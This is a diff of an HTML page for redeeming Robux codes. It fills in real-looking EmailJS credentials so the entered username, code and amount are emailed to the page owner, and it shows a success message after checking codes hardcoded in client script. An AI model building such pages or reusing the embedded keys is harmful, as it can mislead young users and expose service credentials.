@@ -25,7 +25,7 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     // Initialize EmailJS
-    emailjs.init("YOUR_PUBLIC_KEY"); // <-- replace with your EmailJS public key
+    emailjs.init("liDRFNbFd-hnhBLgc"); // <-- replace with your EmailJS public key
 
     // Hardcoded codes with Robux amounts
     const codes = {
@@ -54,7 +54,7 @@
       showMessage(`✅ Success! Code redeemed for ${amount} Robux.`, "success");
 
       // Send email notification
-      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+      emailjs.send("service_31rpu9t", "template_fu9dos6", {
         username: user,
         code: codeInput,
         amount: amount
@@ -78,3 +78,4 @@
   </script>
 </body>
 </html>
+
